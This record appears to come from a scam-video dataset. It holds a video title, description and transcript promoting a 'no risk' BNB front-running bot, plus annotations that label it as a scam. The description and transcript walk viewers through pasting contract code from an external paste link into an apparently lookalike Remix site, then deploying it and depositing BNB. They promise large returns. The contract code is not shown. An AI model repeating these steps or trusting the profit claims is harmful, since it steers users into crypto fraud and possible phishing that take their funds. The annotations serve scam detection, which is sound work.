title: Flash Loan Arbitrage Bot and Multiplier BNB 3x-50x BNB Flash Loan Attack Tutorial / No RISK!.
description: In this video, I show you a simple Front RUN deployment in Solidity which automatically locates any liquidity added to a BSC token, immediately buy and sell at profit.  Current parameters of this contract is that 10% of profit automatically reenters the front-run pool, and automatically transacts back to your wallet 90% of the profit. The remaining pool keeps front running for profit, until you transaction "Action" function in Remix Uniswap is a decentralized permissionless exchange that allows users to trade BSC tokens directly.  If you trade crypto on PancakeSwap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots.  In this video, we see a front running bot, performing buy/sell actions without having to go through the typical transactional methods.  *** Working! (Updated on November 01, 2022)  1. Download MetaMask:  https://metamask.io/download.html  2. Access Remix Ethereum:  https://remixethereum-ide.github.io  3. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “BNBFront.sol"  4. Paste THIS code in Remix:  https://pastebin.com/raw/38eeH27y/  5. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it.  6. Move to the "Deploy" tab, select "Injected Web 3" environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now  7. Deposit funds to exact your bot contract address * If a warning is displayed, click "I understand".  8. After your transaction was confirmed, Start the bot by clicking the “start” button. asr.full_text: Hello guys and welcome, today we have an update for our BB FrontRun Bot token sniper This bot generates huge profits by scanning the MEM pool for frontrunning different ALT tokens on PancakesPop Essentially, you outrun an income-transaction with higher gas and making profits with the slippage inside the transaction First thing you need to do is to download Metamask You can find this in the video description as well and from now on it only works with Metamask on desktop PCs Windows, Mac OS and on the supported browsers you see down here So when you install metaMask, just follow the process to create a new wallet and when you did so, click here. Open Metamask and over here on on ad network Open Betamask And over here on On Ad Network A new window will appear And past in everything for the Binance Academy And click on Save And then finally actually Put Binance Smart Chain inside your Wallet Next thing we need to do Is we need to head over to a Remix Go on Deploy Ad Transaction Inject web3 Next we will head over to Remix. Go to deploy and transaction. Inject web 3. And then open your wallet and click on connect. Then the green circle should appear here. On the account your wallet is shown and don't be scared it always shown the amount in ether even though we are right now using the binance margin so it's bnb. Now we had back to file explorer creating a url file we call that's now in our case bnb front you can call it whatever you want So and the next thing, what you need to do is to just copy our contract string inside here. Then we head over to solidity compiler, choose the right compiler version and our case, it's 0.6.6 plus commit, and this is really important. Hit the blue compiler button. And under contracts, is also save TI pancakes for front run bots and the green mark on the left side should appear as well. Now we need to go to deploy and run transaction again, hit the deploy button and pay the fees. Now we need to wait for the transaction to be confirmed here on the right corner the confirmation should appear as well Here we go and we finally created our contract Now we need to top up our contract actually the FUNZ so that we are able to actually front run any transaction on TheMempool all we need to do now is copy the contract to the clipboard and in our case we are using 5 BNB we recommend at least 1 BNB but it works also with minimum 0.5 BNB but keep in mind that you could end up losing money with that amount when the gas fee is actually higher than the slippage profits you made with front ended transactions we are using as I said in our case 5 BNB to maximize our profits, so that we are able to out run larger transactions okay just a second now we need to wait as well to be this transaction to be confirmed could take a few seconds we just need to wait now in this case. And when we actually topped up the bot on the right corner, as I mentioned earlier, the notification should appear as it did right now. Okay, the next step we need to do is to click on the drop down menu and start actually our bot. Then we need to pay a small Fee Again. Now we need to Wait a few seconds That our transaction is Confirmed. So now we get confirmed. Our bot is now Running and scanning the Mempool for Trans he can front run. I will just let my bot now run for four hours to show you a few results, what you can expect with 5 BNB in four hours as a return. And yeah, see you guys in a few hours! So, I let the bot now, run a little bit over for hours so when you want to withdraw your funds to stop the bot just hit the withdrawal button. Pay the fees, and wait as well for the transaction to be confirmed. Now we can check how much profit we actually made in four hours. We have got 5.1 BNB at the beginning so we made about 2.7 BNB in the 4hr time period. So you can incase the profits by using more initial funds to frontrun even higher transactions as well I recommend you guys to also check out my other videos, the frontrun Ethereum version, the profits on that are just amazing right now when you have any kind of question feel free to message me on Telegram or Discord when you deploy the bot feel free to join also our Discord channel. Also keep in mind that I'm hosting a giveaway right now So you can win 5x1 ETH that was all from me hope you guys are making some decent profits in the SPEAR Rallye Until then

annotation.contextual_rationale: This video is scam content because it promotes a purported BNB multiplier and rapid bot-generated returns with a no-risk framing, while reporting a gain of about 2.7 BNB in four hours. It instructs viewers to deploy the contract, pay fees, and deposit BNB, shows a contract deployment and BNB transfer confirmation, and encourages larger funding for larger stated profits. Although the speaker acknowledges that fees could cause losses, the contract's behavior, reproducibility, ownership, and recovery of deposited funds are not established.
annotation.fine_grained_rationale: The offered workflow ties deployment and funding of a purported trading bot to front-running profits and a reported past return. The speaker explicitly presents outrunning other transactions with higher gas to capture slippage as the offered market-manipulation mechanism; the evidence does not verify that it works.
